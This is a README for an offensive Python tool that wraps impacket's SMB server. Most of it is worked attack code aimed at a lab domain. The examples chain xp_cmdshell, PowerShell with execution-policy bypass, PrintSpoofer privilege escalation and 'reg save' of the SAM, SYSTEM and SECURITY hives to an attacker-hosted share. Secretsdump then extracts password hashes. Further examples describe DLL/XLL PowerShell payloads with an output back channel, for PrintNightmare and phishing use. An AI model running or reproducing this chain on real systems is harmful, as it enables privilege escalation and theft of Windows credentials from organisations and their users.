# angry_smb
Use impackets smb server as a context manager!

Angry SMB offers a neat way to abstract running an SMB server in a tidy context manager which cleans up after itself. Additionally it offers an object oriented way to handle files within the share as well as files we expect to be in the share at some point in the future.

# Usage
The following code snippet shows a multi staged attack to secretsdump from a mssql shell in Game Of Active Directory. This showcases most of the neat features Angry SMB has to offer.

```python3
# This is an example how to use the temporary SMB server to dump the secrets from an impacket-mssqlclient shell
# the environment used was GOAD with the sql_svc user on 192.168.56.23 (no defender)

import logging
from tempsmbserver import TempSMB

from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets

# using the Temporary SMB server as a context manager
with TempSMB(local_ip="192.168.56.106") as smb:
    # creating future objects which we expect to get
    # those are available as objects but are not real files - those will be available after the successful attack
    sam = smb.future_file(friendly_name="sam")
    system = smb.future_file(friendly_name="system")
    security = smb.future_file(friendly_name="security")

    # creating the registry commands as a powershell file in the smb server
    # the actual file handling is fully abstracted in the TempSMB and SMBFile objects
    sam_dump_payload = f"reg save hklm\\sam {sam.remote_path}\nreg save hklm\\security {security.remote_path}\nreg save hklm\\system {system.remote_path}"
    sam_dump_file = smb.create_temp_file(sam_dump_payload, ext=".ps1")

    # copying the printspoofer executable into the temporary smb server and creating a powershell command to run it
    # instead of defining a file by its content an existing file is copied and shared
    # again all file handling is abstraced into the objects
    print_spoofer_file = smb.create_temp_file_from_file("/home/kali/potatos/PrintSpoofer64.exe")
    stager = f'{print_spoofer_file.remote_path} -c "powershell.exe -ep bypass {sam_dump_file.remote_path}"'
    stager_file = smb.create_temp_file(stager, ext=".ps1")

    # creating the xp_cmdshell command to be run in the impacket-mssqlclient shell
    print("run this on your mssql shell:")
    print(f"xp_cmdshell powershell.exe -ep bypass {stager_file.remote_path}")

    # awaiting the future files to actually be written to the smb server
    # this blocks execution until all the awaited files are present in the share
    # file objects created via the TempSMB methods can be accessed by key on the TempSMB object if it has a friendly name
    sam.await_me()
    system.await_me()
    security.await_me()
    print(f'SAM received at {smb["sam"].local_path} - {smb["sam"].exists()}')
    print(f'SYSTEM received at {smb["system"].local_path} - {system.exists()}')
    print(f'SECURITY received at {security.local_path} - {security.exists()}')

    # basic secretsdump code with impacket
    logging.getLogger().setLevel(logging.INFO)

    local_ops = LocalOperations(system.local_path)
    boot_key = local_ops.getBootKey()
    sam_hashes = SAMHashes(sam.local_path, boot_key)
    lsa_secrets = LSASecrets(security.local_path, boot_key)
    print("="*10+"SAM"+"="*10)
    sam_hashes.dump()
    print("=" * 10 + "CHACHED CREDS" + "=" * 10)
    lsa_secrets.dumpCachedHashes()
    print("=" * 10 + "SECRETS" + "=" * 10)
    # commented out for cleaner terminal output
    #lsa_secrets.dumpSecrets()

    sam_hashes.finish()
    lsa_secrets.finish()


```


Fortunately there are also some payload classes which abstract some use cases - the next code snippet does the same as the previous

```python3
from payload import SamDumpPowershell, PrintSpoofer, PowershellRunner
from tempsmbserver import TempSMB
from stolen_from_impacket.secretsdump import dump

local_ip = "192.168.56.106"
print_spoofer = True

with TempSMB(local_ip=local_ip) as smb:
    sam_dump_payload = SamDumpPowershell(smb)
    if print_spoofer:
        print_spoofer_file = smb.create_temp_file_from_file("/home/kali/potatos/PrintSpoofer64.exe")
        print_spoofer_payload = PrintSpoofer(smb, input_files=[print_spoofer_file, sam_dump_payload.file])
        runner_payload = PowershellRunner(smb, [print_spoofer_payload.file])
    else:
        runner_payload = PowershellRunner(smb, [sam_dump_payload.file])

    print("ANGRY SMB READY:")
    print(f"xp_cmdshell {runner_payload.payload}")
    sam_dump_payload.await_output_files()

    print("="*10 + "secretsdump" + "="*10)
    dump(sam_dump_payload.sam.local_path, sam_dump_payload.system.local_path, sam_dump_payload.security.local_path)


```

There are also payload classes to execute Powershell from a dll or xll e.g. for Printnightmare or xll phishing attacks. The next code snipped also implements a back channel which writes the command output to an output file in the share. Please refer to the examples folder.

```python3
from payload import CRunPowershell
from tempsmbserver import TempSMB

local_ip = "192.168.56.106"


with TempSMB(local_ip=local_ip) as smb:
    powershell_payload = "net user skid IHaveNotReadTheCode /add; net user skid /delete;"
    return_channel = smb.future_file(ext=".out")
    powershell_file = smb.create_temp_file(f"{powershell_payload} > {return_channel.remote_path}", ext=".ps1")
    dll_payload = CRunPowershell(smb, [powershell_file])
    print(dll_payload.file.remote_path.replace("/", "\\"))
    return_channel.await_me()
    return_channel.print(cringe_utf_16=True)

```
***
# IMPORTANT!!
The examples folder is NOT meant to provide ready to use tools but act as an inspiration and to showcase the capabilities of Angry SMB!! Ready to use tools might or might not come in the future - I wouldnt bet on it though!!
***
# Requirements
- impacket
- mingw

both should be available on kali

***
# Documentation (kinda)
## TempSMB
### create_temp_file(content, friendly_name, ext)
Creates a new file in the share and returns an SMBFile object
### create_temp_file_from_file(existing_file, friendly_name)
Copies an existing file into the share and returns an SMBFile object
### future_file(ext, friendly_name)
Creates an SMBFile object for a file which doesnt exist yet and returns it
### connection_string()
Returns the location of the share as seen from remote
## SMBFile
### exists()
Checks if the file exists on the file system
### await_me(timeout)
Blocks execution until the file exists on the file system or until timeout
### print(cringe_utf_16)
Prints the content of the file - has some rudimentary UTF-16 cringe handling for bytes which break the output

## Payloads
Refer to the examples folder.

  
